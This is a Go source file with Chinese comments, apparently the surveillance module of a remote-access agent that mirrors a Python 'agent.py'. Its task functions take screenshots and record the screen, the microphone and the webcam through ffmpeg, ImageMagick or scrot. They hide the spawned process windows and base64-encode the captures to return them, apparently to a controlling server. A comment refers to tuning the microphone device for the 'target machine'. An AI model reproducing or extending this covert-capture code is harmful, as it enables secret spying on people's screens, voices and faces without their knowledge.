package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

// 纯 Go 交叉编译要求: 不使用 cgo 媒体库。
// 媒体采集通过 OS 原生工具实现:
//   Windows: PowerShell + System.Drawing (截图/录像/摄像头)
//   Linux:   scrot / ImageMagick import (截图), ffmpeg (录像/音频/摄像头)
// 工具不可用时返回明确错误（与 Python agent 缺少依赖时的行为一致）

func tmpDir() string {
	if d := os.Getenv("TEMP"); d != "" {
		return d
	}
	if d := os.Getenv("TMPDIR"); d != "" {
		return d
	}
	return "/tmp"
}

// toolExists 检查可执行文件是否存在
func toolExists(name string) bool {
	_, err := exec.LookPath(name)
	return err == nil
}

// ===== 截图 =====

// taskScreenshot 截屏，与 agent.py task_screenshot 对齐
// 参数: resolution (360p/720p/1080p, 默认 720p)
// JPEG 质量随分辨率: 360→55, 720→65, 1080→75
func taskScreenshot(d map[string]interface{}) string {
	resolution := tdGetString(d, "resolution", "720p")
	targetH := 720
	switch resolution {
	case "360p":
		targetH = 360
	case "720p":
		targetH = 720
	case "1080p":
		targetH = 1080
	}
	quality := 65
	switch targetH {
	case 360:
		quality = 55
	case 720:
		quality = 65
	case 1080:
		quality = 75
	}

	var data []byte
	var err error
	if runtime.GOOS == "windows" {
		data, err = captureScreenWindows(targetH, quality)
	} else {
		data, err = captureScreenLinux(targetH, quality)
	}
	if err != nil {
		return "[ERROR] " + err.Error()
	}
	return base64.StdEncoding.EncodeToString(data)
}

func captureScreenLinux(targetH, quality int) ([]byte, error) {
	tmpPath := filepath.Join(tmpDir(), fmt.Sprintf("_scr_%d.jpg", time.Now().Unix()))
	defer os.Remove(tmpPath)
	// 优先 ImageMagick import（支持缩放+质量）
	if toolExists("import") {
		cmd := exec.Command("import", "-window", "root", "-resize", fmt.Sprintf("x%d", targetH),
			"-quality", fmt.Sprintf("%d", quality), tmpPath)
		hideWindow(cmd)
		if cmd.Run() == nil {
			return os.ReadFile(tmpPath)
		}
	}
	// 其次 scrot（输出 JPEG，不支持缩放/质量参数）
	if toolExists("scrot") {
		cmd := exec.Command("scrot", tmpPath)
		hideWindow(cmd)
		if cmd.Run() == nil {
			return os.ReadFile(tmpPath)
		}
	}
	// 最后尝试 ffmpeg x11grab
	if toolExists("ffmpeg") {
		cmd := exec.Command("ffmpeg", "-y", "-f", "x11grab", "-video_size", "1920x1080",
			"-i", ":0.0", "-vframes", "1", "-vf", fmt.Sprintf("scale=-2:%d", targetH),
			"-q:v", fmt.Sprintf("%d", 31-quality/5), tmpPath)
		hideWindow(cmd)
		if cmd.Run() == nil {
			return os.ReadFile(tmpPath)
		}
	}
	return nil, fmt.Errorf("无可用的截屏工具 (需安装 imagemagick/scrot/ffmpeg)")
}

// ===== 录屏 =====

// taskRecordScreen 录屏，与 agent.py task_record_screen 对齐
// 参数: duration (秒, 上限 60)
// 优先 ffmpeg 录制为 avi(XVID)；不可用时回退为 JPEG 帧序列
func taskRecordScreen(d map[string]interface{}) string {
	duration := tdGetInt(d, "duration", 10)
	if duration > 60 {
		duration = 60
	}
	if duration < 1 {
		duration = 1
	}

	if runtime.GOOS == "windows" {
		return recordScreenWindows(duration)
	}
	return recordScreenLinux(duration)
}

func recordScreenWindows(duration int) string {
	if !toolExists("ffmpeg") {
		return recordScreenFrames(duration, "powershell")
	}
	tmpPath := filepath.Join(tmpDir(), fmt.Sprintf("_rec_%d.avi", time.Now().Unix()))
	defer os.Remove(tmpPath)
	// ffmpeg gdigrab 录屏 → XVID avi
	cmd := exec.Command("ffmpeg", "-y", "-f", "gdigrab", "-framerate", "8",
		"-i", "desktop", "-t", fmt.Sprintf("%d", duration),
		"-c:v", "mpeg4", "-vtag", "XVID", "-q:v", "5", tmpPath)
	hideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		_ = out
		return recordScreenFrames(duration, "powershell")
	}
	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return "[ERROR] " + err.Error()
	}
	return base64.StdEncoding.EncodeToString(data)
}

func recordScreenLinux(duration int) string {
	if !toolExists("ffmpeg") {
		return "[ERROR] 录屏需安装 ffmpeg (Linux): apt install ffmpeg"
	}
	tmpPath := filepath.Join(tmpDir(), fmt.Sprintf("_rec_%d.avi", time.Now().Unix()))
	defer os.Remove(tmpPath)
	cmd := exec.Command("ffmpeg", "-y", "-f", "x11grab", "-framerate", "8",
		"-video_size", "1920x1080", "-i", ":0.0", "-t", fmt.Sprintf("%d", duration),
		"-c:v", "mpeg4", "-vtag", "XVID", "-q:v", "5", tmpPath)
	hideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("[ERROR] ffmpeg 录屏失败: %v %s", err, string(out))
	}
	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return "[ERROR] " + err.Error()
	}
	return base64.StdEncoding.EncodeToString(data)
}

// recordScreenFrames 无 ffmpeg 时回退: 按帧截图并拼接
// 服务端会保存为 .avi（实为 JPEG 帧序列）
func recordScreenFrames(duration int, _ string) string {
	fps := 8
	frames := duration * fps
	var buf []byte
	for i := 0; i < frames; i++ {
		var data []byte
		var err error
		if runtime.GOOS == "windows" {
			data, err = captureScreenWindows(360, 40)
		} else {
			data, err = captureScreenLinux(360, 40)
		}
		if err == nil {
			buf = append(buf, data...)
		}
		time.Sleep(time.Second / time.Duration(fps))
	}
	if len(buf) == 0 {
		return "[ERROR] 录屏帧捕获失败"
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// ===== 录音 =====

// taskRecordAudio 录音，与 agent.py task_record_audio 对齐
// 参数: duration (秒)
// 需 ffmpeg（Windows: dshow；Linux: alsa/pulse）
func taskRecordAudio(d map[string]interface{}) string {
	duration := tdGetInt(d, "duration", 10)
	if duration < 1 {
		duration = 1
	}
	if !toolExists("ffmpeg") {
		return "[ERROR] 录音需安装 ffmpeg"
	}
	tmpPath := filepath.Join(tmpDir(), fmt.Sprintf("_aud_%d.wav", time.Now().Unix()))
	defer os.Remove(tmpPath)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// 列出 dshow 设备较复杂，这里用默认设备名 "Microphone"
		// 实际部署时可按目标机设备名调整
		cmd = exec.Command("ffmpeg", "-y", "-f", "dshow", "-i", "audio=Microphone",
			"-t", fmt.Sprintf("%d", duration), "-ar", "44100", "-ac", "1", tmpPath)
	} else {
		// Linux: 优先 pulse，回退 alsa
		cmd = exec.Command("ffmpeg", "-y", "-f", "pulse", "-i", "default",
			"-t", fmt.Sprintf("%d", duration), "-ar", "44100", "-ac", "1", tmpPath)
	}
	hideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		// Linux 上尝试 alsa
		if runtime.GOOS != "windows" {
			cmd = exec.Command("ffmpeg", "-y", "-f", "alsa", "-i", "default",
				"-t", fmt.Sprintf("%d", duration), "-ar", "44100", "-ac", "1", tmpPath)
			hideWindow(cmd)
			if err2 := cmd.Run(); err2 == nil {
				if data, err := os.ReadFile(tmpPath); err == nil {
					return base64.StdEncoding.EncodeToString(data)
				}
			}
		}
		return fmt.Sprintf("[ERROR] ffmpeg 录音失败: %v %s", err, string(out))
	}
	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return "[ERROR] " + err.Error()
	}
	return base64.StdEncoding.EncodeToString(data)
}

// ===== 摄像头 =====

// taskCameraPhoto 摄像头拍照
// Windows: cameraPhotoWindows 内部自动尝试 ffmpeg dshow(自动检测设备名) → WIA
// Linux:   ffmpeg v4l2
func taskCameraPhoto(d map[string]interface{}) string {
	var data []byte
	var err error

	if runtime.GOOS == "windows" {
		// cameraPhotoWindows 内部已实现 ffmpeg→WIA 多级回退
		data, err = cameraPhotoWindows()
	} else {
		// Linux: ffmpeg v4l2
		if toolExists("ffmpeg") {
			data, err = cameraPhotoFFmpegLinux()
		} else {
			return "[ERROR] Linux camera requires ffmpeg: apt install ffmpeg"
		}
	}

	if err != nil {
		return fmt.Sprintf("[ERROR] camera photo failed: %v", err)
	}
	if len(data) == 0 {
		return "[ERROR] camera photo: no data captured"
	}
	return base64.StdEncoding.EncodeToString(data)
}

// cameraPhotoFFmpegLinux Linux 上用 ffmpeg v4l2 拍照
func cameraPhotoFFmpegLinux() ([]byte, error) {
	tmpPath := filepath.Join(tmpDir(), fmt.Sprintf("_cam_%d.jpg", time.Now().UnixNano()))
	defer os.Remove(tmpPath)
	cmd := exec.Command("ffmpeg", "-y", "-f", "v4l2", "-i", "/dev/video0",
		"-frames:v", "1", "-q:v", "3", tmpPath)
	hideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("ffmpeg v4l2 failed: %v %s", err, string(out))
	}
	return os.ReadFile(tmpPath)
}

// taskCameraRecord 摄像头录像
// 参数: duration (秒)
// Windows: cameraRecordWindows 内部自动尝试 ffmpeg dshow → 多帧拍照
// Linux:   ffmpeg v4l2
func taskCameraRecord(d map[string]interface{}) string {
	duration := tdGetInt(d, "duration", 10)
	if duration < 1 {
		duration = 1
	}

	var data []byte
	var err error

	if runtime.GOOS == "windows" {
		// cameraRecordWindows 内部已实现 ffmpeg→多帧拍照 回退
		data, err = cameraRecordWindows(duration)
	} else {
		// Linux: ffmpeg v4l2
		if toolExists("ffmpeg") {
			data, err = cameraRecordFFmpegLinux(duration)
		} else {
			return "[ERROR] Linux camera record requires ffmpeg: apt install ffmpeg"
		}
	}

	if err != nil {
		return fmt.Sprintf("[ERROR] camera record failed: %v", err)
	}
	if len(data) == 0 {
		return "[ERROR] camera record: no data captured"
	}
	return base64.StdEncoding.EncodeToString(data)
}

// cameraRecordFFmpegLinux Linux 上用 ffmpeg v4l2 录像
func cameraRecordFFmpegLinux(duration int) ([]byte, error) {
	tmpPath := filepath.Join(tmpDir(), fmt.Sprintf("_cam_%d.avi", time.Now().UnixNano()))
	defer os.Remove(tmpPath)
	cmd := exec.Command("ffmpeg", "-y", "-f", "v4l2", "-i", "/dev/video0",
		"-t", fmt.Sprintf("%d", duration), "-c:v", "mpeg4", "-vtag", "XVID", "-q:v", "5", tmpPath)
	hideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("ffmpeg v4l2 record failed: %v %s", err, string(out))
	}
	return os.ReadFile(tmpPath)
}
